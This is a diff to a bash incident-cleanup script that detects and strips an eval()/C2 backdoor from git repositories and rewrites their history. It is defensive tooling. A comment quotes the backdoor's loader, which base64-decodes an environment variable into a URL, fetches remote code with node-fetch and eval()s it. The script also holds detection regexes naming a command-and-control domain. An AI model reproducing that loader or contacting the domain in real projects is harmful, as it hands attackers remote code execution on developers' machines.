@@ -48,8 +48,16 @@ FIXED_MAP=()                  # filled per repo: "tmpbranch:originalbranch"
 #   auth-confirm-eight…vercel    command-and-control domain (incident IOC)
 #   AUTH_API_KEY                 backdoor env var holding the base64 C2 key
 #   Auth Error!                  the backdoor's benign-looking error label
+#   atob(process.env…            base64-decodes an env var into a URL the backdoor
+#                                fetches and eval()s — the self-executing IIFE form:
+#                                  const src = atob(process.env.AUTH_API_KEY);
+#                                  const proxy = (await import('node-fetch')).default;
+#                                  eval(await (await proxy(src)).text());
 C2_DOMAIN='auth-confirm-eight.vercel.app'
-IOC_RE='_\$_|auth-confirm-eight\.vercel\.app|AUTH_API_KEY|Auth Error!'
+# Signature of the eval()/C2 backdoor specifically (everything except the loader
+# marker). Used to strip/remove it when there is no clean ancestor to restore.
+EVAL_C2_RE='auth-confirm-eight\.vercel\.app|AUTH_API_KEY|Auth Error!|atob[[:space:]]*\([[:space:]]*process\.env'
+IOC_RE="_\\\$_|$EVAL_C2_RE"
 
 # Commands that EXECUTE these backdoors — never run them on an unscanned checkout:
 #   npm/yarn install, build/dev, AND (from the incident) drizzle-kit migrate,
@@ -262,7 +270,9 @@ ioc_labels() {
   git grep -qIE '_\$_' "$ref" 2>/dev/null && out="$out loader"
   git grep -qI "$C2_DOMAIN" "$ref" 2>/dev/null && out="$out C2-url"
   git grep -qI 'AUTH_API_KEY' "$ref" 2>/dev/null && out="$out AUTH_API_KEY"
-  git grep -qI 'Auth Error!' "$ref" 2>/dev/null && out="$out eval-backdoor"
+  { git grep -qI 'Auth Error!' "$ref" 2>/dev/null \
+    || git grep -qIE 'atob[[:space:]]*\([[:space:]]*process\.env' "$ref" 2>/dev/null; } \
+    && out="$out eval-backdoor"
   printf '%s' "${out# }"
 }
 
@@ -337,6 +347,33 @@ strip_marker_file() {
        END{ while(n>0 && a[n] ~ /^[[:space:]]*$/) n--; for(i=1;i<=n;i++) print a[i] }' \
        "$f.__s3" > "$f"
   rm -f "$f.__s1" "$f.__s2" "$f.__s3"
+}
+
+# Remove ONLY the eval()/C2 backdoor IIFE from a working-tree file, in place,
+# and KEEP the file (it is legitimate/needed — never deleted, even if the strip
+# leaves it empty). Excises exactly the self-executing
+#   (async () => { … atob(process.env…) … (await import('node-fetch')) … eval(…) … })();
+# block: it locates the opening `(async () => {` line and removes every line up
+# to and including the brace-matched close `})();` (so the nested node-fetch
+# import and the eval call go with it). Every other line — real config, even a
+# pre-existing `import 'dotenv/config';` — is left untouched.
+strip_eval_backdoor() {
+  local f="$1"
+  awk '
+    # inside the IIFE: count braces (without altering the line) until balanced
+    drop>0 { o=gsub(/\{/,"&"); c=gsub(/\}/,"&"); drop+=o-c; if(drop<=0) drop=0; next }
+    # start of the malicious self-executing async IIFE
+    /\(async[[:space:]]*\([[:space:]]*\)[[:space:]]*=>[[:space:]]*\{/ {
+      o=gsub(/\{/,"&"); c=gsub(/\}/,"&"); drop=o-c; if(drop<=0) drop=0; next
+    }
+    { print }
+  ' "$f" > "$f.__e1"
+  # tidy leading/trailing blank lines left where the block used to be
+  awk 'BEGIN{n=0;st=0}
+       { if(!st && $0 ~ /^[[:space:]]*$/) next; st=1; a[++n]=$0 }
+       END{ while(n>0 && a[n] ~ /^[[:space:]]*$/) n--; for(i=1;i<=n;i++) print a[i] }' \
+       "$f.__e1" > "$f"
+  rm -f "$f.__e1"
 }
 
 # Repo in CWD has anything worth cleaning? (env issues count only in --env mode)
@@ -484,8 +521,15 @@ clean_branch() {
       strip_marker_file "$f"
       printf '      %-26s loader stripped in place; result below:\n' "$f"
       sed 's/^/          | /' "$f"
+    elif grep -qE "$EVAL_C2_RE" "$f" 2>/dev/null; then
+      # eval()/C2 backdoor with no clean ancestor: the file itself is legitimate,
+      # so excise ONLY the injected IIFE block and keep the file (never delete it,
+      # even if the strip leaves it empty).
+      strip_eval_backdoor "$f"
+      printf '      %-26s eval/C2 IIFE removed in place; result below:\n' "$f"
+      sed 's/^/          | /' "$f"
     else
-      # eval/C2 backdoor with no clean ancestor — refuse to guess; flag it.
+      # unknown IOC with no clean ancestor — refuse to guess; flag it.
       printf '      %s %s: no clean version in history — MANUAL REVIEW REQUIRED\n' "$(c_red 'SKIP')" "$f"
     fi
   done < <(printf '%s\n' "$files")
@@ -677,6 +721,23 @@ grep -rIlF -- "$MARKER" . 2>/dev/null | while IFS= read -r f; do
   rm -f "$f.__s1" "$f.__s2" "$f.__s3"
 done
 
+# 1b) remove ONLY the eval()/C2 backdoor IIFE from every file that carries its
+#     signature, and KEEP the file (it is legitimate/needed — never deleted,
+#     even if the strip leaves it empty). Excises the brace-matched
+#     `(async () => { … })();` block; every other line is left untouched.
+eval_re='auth-confirm-eight\.vercel\.app|AUTH_API_KEY|Auth Error!|atob[[:space:]]*\([[:space:]]*process\.env'
+grep -rIlE "$eval_re" . 2>/dev/null | while IFS= read -r f; do
+  [ -f "$f" ] || continue
+  awk '
+    drop>0 { o=gsub(/\{/,"&"); c=gsub(/\}/,"&"); drop+=o-c; if(drop<=0) drop=0; next }
+    /\(async[[:space:]]*\([[:space:]]*\)[[:space:]]*=>[[:space:]]*\{/ {
+      o=gsub(/\{/,"&"); c=gsub(/\}/,"&"); drop=o-c; if(drop<=0) drop=0; next }
+    { print }' "$f" > "$f.__e1"
+  awk 'BEGIN{n=0;st=0}{if(!st&&$0~/^[[:space:]]*$/)next;st=1;a[++n]=$0}
+       END{while(n>0&&a[n]~/^[[:space:]]*$/)n--;for(i=1;i<=n;i++)print a[i]}' "$f.__e1" > "$f"
+  rm -f "$f.__e1"
+done
+
 # 2) remove config.bat from every .gitignore, and restore .env ignore rules
 #    (matches `clean`: add a real .env rule wherever one isn't already present)
 find . -name .gitignore -type f 2>/dev/null | while IFS= read -r gi; do
@@ -713,6 +774,14 @@ purge_repo() {
     git branch -f "${rb#origin/}" "$rb" >/dev/null 2>&1
   done < <(remote_branches)
 
+  # Ensure HEAD resolves to a real branch. A clone whose origin HEAD is dangling
+  # (points at a default branch that was never pushed) leaves HEAD on a missing
+  # ref, and filter-branch then aborts with "Needed a single revision".
+  if ! git rev-parse --verify -q HEAD >/dev/null 2>&1; then
+    local head1; head1="$(git for-each-ref --format='%(refname:short)' refs/heads | head -1)"
+    [ -n "$head1" ] && { git symbolic-ref HEAD "refs/heads/$head1"; git checkout -q "$head1" 2>/dev/null; }
+  fi
+
   echo "  rewriting history (filter-branch, all branches)…"
   # A rewrite changes every SHA, so any pre-existing signature is invalidated.
   # When signing is configured, re-sign each rewritten commit via a commit-filter
@@ -722,10 +791,13 @@ purge_repo() {
     commit_filter='git commit-tree -S "$@"'
     echo "  (re-signing every rewritten commit — slower; honors your signing key)"
   fi
-  FILTER_BRANCH_SQUELCH_WARNING=1 git filter-branch --force \
-    --tree-filter "TREECLEAN_UNTRACK=${UNTRACK_SECRETS:-0} bash '$cleaner'" \
-    --commit-filter "$commit_filter" \
-    -- --branches >/dev/null 2>&1 || { echo "  $(c_red 'filter-branch failed')"; popd >/dev/null; return; }
+  local fberr
+  if ! fberr="$(FILTER_BRANCH_SQUELCH_WARNING=1 git filter-branch --force \
+      --tree-filter "TREECLEAN_UNTRACK=${UNTRACK_SECRETS:-0} bash '$cleaner'" \
+      --commit-filter "$commit_filter" \
+      -- --branches 2>&1)"; then
+    echo "  $(c_red 'filter-branch failed'): ${fberr##*$'\n'}"; popd >/dev/null; return
+  fi
 
   # verify every local branch is clean
   local bad=0
